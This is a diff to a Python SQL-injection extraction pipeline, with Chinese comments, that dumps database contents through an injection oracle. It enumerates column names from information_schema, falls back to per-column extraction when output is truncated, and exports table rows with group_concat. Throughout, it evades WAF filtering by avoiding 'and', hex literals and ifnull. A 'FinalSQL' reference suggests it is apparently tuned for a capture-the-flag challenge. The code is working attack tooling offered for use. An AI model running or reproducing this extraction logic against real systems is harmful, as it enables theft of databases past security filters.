@@ -100,43 +100,58 @@ class ExtractionPipeline:
         return self._slow_list("table_name", where)
 
     def list_columns(self, db: str, table: str) -> list:
+        # 单条件 table_name 最通用：FinalSQL 类强 WAF 拦 and 双条件与 0x hex 字面量
         lit = self.b.str_lit(table)
-        where = (f"information_schema.columns where table_schema="
-                 f"{self.b.str_lit(db)} and table_name={lit}")
+        where = f"information_schema.columns where table_name={lit}"
         if self._can_group_concat():
-            return self._fast_list("column_name", where)
-        return self._slow_list("column_name", where)
+            cols = self._fast_list("column_name", where)
+            if cols and all(len(c) <= 150 for c in cols):
+                return cols
+            # group_concat(1024) 截断风险（FinalSQL 类超长 ~ 列名）→ 按列序完整提取
+            self.log("INFO", "[脱库] 列名疑似被 group_concat 截断，改用 ordinal_position 逐列提取")
+        return self._columns_by_ordinal(db, table)
+
+    def _columns_by_ordinal(self, db: str, table: str) -> list:
+        """按 ordinal_position 等值提取（免 limit；需 and 可用，作超长列名 fallback）。"""
+        where = f"information_schema.columns where table_name={self.b.str_lit(table)}"
+        try:
+            count = self.o.scalar_int(f"(select count(1) from {where})")
+        except OracleError:
+            return []
+        cols = []
+        for i in range(1, count + 1):
+            if self.s.stopped:
+                break
+            c = self.o.scalar(f"(select column_name from {where} "
+                              f"and ordinal_position={i})")
+            if not c:
+                break
+            cols.append(c)
+            self.log("INFO", f"[脱库] 列[{i}]: {(c[:24] + '…') if len(c) > 24 else c}")
+        return cols
 
     # ------------------------------------------------------------------ data
     def dump_rows(self, db: str, table: str, columns: list,
                   max_rows: int = 20) -> list:
-        if not self.waf.is_filtered("concat_ws"):
-            cols_expr = ("concat_ws(0x7e," +
-                         ",".join(f"ifnull({c},0x4e554c4c)" for c in columns) + ")")
-        else:
-            sep = ""
-            parts = []
-            for c in columns:
-                parts.append(f"ifnull({c},0x4e554c4c)")
-                parts.append("0x7e")
-            cols_expr = "concat(" + ",".join(parts[:-1]) + ")"
+        # limit 依赖空格/tab（严格形态下不可用）→ group_concat 全量导出（紧凑无空格）
+        # 分隔字面量自适应：引号可用走引号，被滤走 hex（FinalSQL 恰好相反：hex 被拦）
+        # concat_ws 自身忽略 NULL 参数（免 ifnull——FinalSQL 类 WAF 拦 ifnull）
+        sep = self.b.str_lit("~")
+        cols_expr = "concat_ws(" + sep + "," + ",".join(columns) + ")"
+        raw = self.o.scalar(f"(select group_concat({cols_expr}) from {db}.{table})")
         rows = []
-        for i in range(max_rows):
-            if self.s.stopped:
-                break
-            raw = self.o.scalar(
-                f"(select {cols_expr} from {db}.{table} limit {i},1)")
-            if not raw:
-                break
-            parts = raw.split("~")
-            row = {c: (parts[j] if j < len(parts) else "") for j, c in enumerate(columns)}
+        for chunk in raw.split(",")[:max_rows]:
+            parts = chunk.split("~")
+            row = {c: (parts[j] if j < len(parts) else "")
+                   for j, c in enumerate(columns)}
             rows.append(row)
-            self.log("DATA", f"[{db}.{table}] {row}")
+            self.log("DATA", f"[{db}.{table}] "
+                             f"{ {k[:16]: v[:40] for k, v in row.items()} }")
         return rows
 
     def table_row_count(self, db: str, table: str) -> int:
         try:
-            return self.o.scalar_int(f"(select count(*) from {db}.{table})")
+            return self.o.scalar_int(f"(select count(1) from {db}.{table})")
         except OracleError:
             return -1
 
@@ -185,6 +200,12 @@ class ExtractionPipeline:
             if self.s.stopped:
                 break
             cols = res.columns.get((db, t), [])
-            if cols and pri == 2:
-                res.rows[(db, t)] = self.dump_rows(db, t, cols, max_rows)
+            if not cols:
+                continue
+            # 关键词命中表全量导出；其余用户表也探前 3 行
+            # （FinalSQL 类：列名是一串 ~，表名/列名均不含关键词，数据藏在其中）
+            n_rows = max_rows if pri == 2 else min(3, max_rows)
+            self.log("INFO", f"[脱库] 导出 {db}.{t} 前 {n_rows} 行（列名示例: "
+                             f"{(cols[0][:20] + '…') if len(cols[0]) > 20 else cols[0]}）")
+            res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
         return res
